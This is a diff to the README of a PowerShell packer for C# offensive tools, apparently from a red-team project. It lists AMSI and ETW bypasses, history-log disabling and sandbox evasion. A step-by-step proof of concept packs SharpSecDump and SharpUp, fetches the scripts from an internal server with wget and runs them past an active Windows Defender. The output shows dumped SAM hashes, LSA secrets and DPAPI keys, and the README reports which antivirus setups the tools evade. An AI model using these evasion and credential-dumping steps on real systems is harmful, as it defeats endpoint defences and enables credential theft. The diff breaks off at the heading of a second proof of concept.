@@ -17,13 +17,158 @@ Features
   + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
   + wait for 60 seconds before execution
 
-Important note
---------------
-=> It works well with Windows server 2016 but not with Windows 10.
+Important note regarding AV
+----------------------------
+I tested successfully my packer script with the C# tools Rubeus, SharpKatz, SharSecDump, SharpUp and SharpChromium on a Windows server 2016
+with 2 AV solutions enabled and up-to-date (including Windows Defender). 
+However, unlike for Windows server 2016, the packed scripts are blocked on Windows 10 laptops when Windows Defender is enabled.
 
 
 =====================================================================================================================================
-Examples - Run a packed/encrypted version of Rubeus and SharpKatz on a Windows server 2016 without being detected by Windows Defender
+PoC 1 - Run a packed/encrypted version of SharpSecDump & SharpUp on a Windows server 2016 without being detected by Windows Defender
+=====================================================================================================================================
+
+-------------------------------------------------------------------------------------------------------------
+Step 1 - Create a packed/encrypted version of SharpSecDump & SharpUp using 'Invoke-PoSH-CsharpPacker.ps1'
+-------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> . .\Invoke-PoSH-CsharpPacker.ps1
+
+   ___    _                     ___         _
+  / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _
+ | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
+  \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|
+                      |_|                               v2.0
+
+Usage:
+> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\temp> Invoke-PoSH-CsharpPacker -FileUrl https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpSecDump.exe -OutFile C:\temp\Packed-SharpSecDump.ps1
+[*] Downloading the remote .NET executable file: 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpSecDump.exe'
+[*] Creating the .NET executable loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted .NET executable loader script has been saved: 'C:\temp\Packed-SharpSecDump.ps1' ...
+[+] Done!
+PS C:\temp>
+
+
+PS C:\temp> Invoke-PoSH-CsharpPacker -FilePath C:\Users\Administrator\Documents\Tools-Pentest\13-SharpCollection\x64\SharpUp.exe -OutFile C:\temp\Packed-sharpup.ps1
+[*] Loading the .NET executable file: 'C:\Users\Administrator\Documents\Tools-Pentest\13-SharpCollection\x64\SharpUp.exe
+[*] Creating the .NET executable loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted .NET executable loader script has been saved: 'C:\temp\Packed-sharpup.ps1' ...
+[+] Done!
+
+
+--------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download & execute the packed/encrypted version of SharpSecDump & SharpUp without being detected by the Windows Defender AV
+--------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\temp> powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+
+PS C:\Users\temp> systeminfo
+
+Host Name:                 WEBSERVER2
+OS Name:                   Microsoft Windows Server 2016 Datacenter
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00377-90016-42795-AA673
+Original Install Date:     29/01/2023, 23:32:13
+System Boot Time:          14/02/2023, 00:42:37
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+<SNIP>
+
+
+PS C:\Users\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 13/02/2023 08:32:06
+
+
+PS C:\Users\temp> wget -URI http://192.168.1.113:8081/temp/packed-sharpup.ps1 -Outfile ./packed-sharpup.ps1
+
+PS C:\Users\temp> wget -URI http://192.168.1.113:8081/temp/packed-sharpsecdump.ps1 -Outfile ./packed-sharpsecdump.ps1
+
+PS C:\Users\temp> ls
+
+    Directory: C:\temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       14/02/2023     01:41          35546 packed-sharpsecdump.ps1
+-a----       14/02/2023     01:02          32326 packed-sharpup.ps1
+
+
+PS C:\Users\temp> . .\packed-sharpsecdump.ps1
+
+PS C:\Users\temp> Invoke-Packed-Net-Executable -target='127.0.0.1'
+
+[*] RemoteRegistry service started on 127.0.0.1
+[*] Parsing SAM hive on 127.0.0.1
+[*] Parsing SECURITY hive on 127.0.0.1
+[*] Sucessfully cleaned up on 127.0.0.1
+---------------Results from 127.0.0.1---------------
+[*] SAM hashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5765db1aaab4075e163a860<SNIP>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+user1:1000:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e662796<SNIP>
+user2:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e662796<SNIP>
+user3:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e662796<SNIP>
+[*] Cached domain logon information(domain/username:hash)
+[*] LSA Secrets
+[*] $MACHINE.ACC
+company.work\Webserver2$:aad3b435b51404eeaad3b435b51404ee:b71e7e77879711011bc5c<SNIP>
+[*] DPAPI_SYSTEM
+dpapi_machinekey:33c75f0773ca00f35289e2e6acee70d531926eb1
+dpapi_userkey:bda3a10f1ca86a4e8a58f9439ff55bd741e29049
+[*] NL$KM
+NL$KM:6466ccc5d26c2ce13907e03df07709d503b4d2e5f835f0d47a28572e594ec45532867a79e31e9ca356e796c2d<SNIP>
+---------------Script execution completed---------------
+
+
+PS C:\Users\temp> . .\packed-sharpup.ps1
+PS C:\Users\temp> Invoke-Packed-Net-Executable
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+[*] Already in high integrity, no need to privesc!
+[*] Quitting now, re-run with "audit" argument to run checks anyway (audit mode).
+[*] Completed Privesc Checks in 0 seconds
+
+
+=====================================================================================================================================
+PoC 2 - Run a packed/encrypted version of Rubeus and SharpKatz on a Windows server 2016 without being detected by Windows Defender
 =====================================================================================================================================
 
 --------------------------------------------------------------------------------------------------------
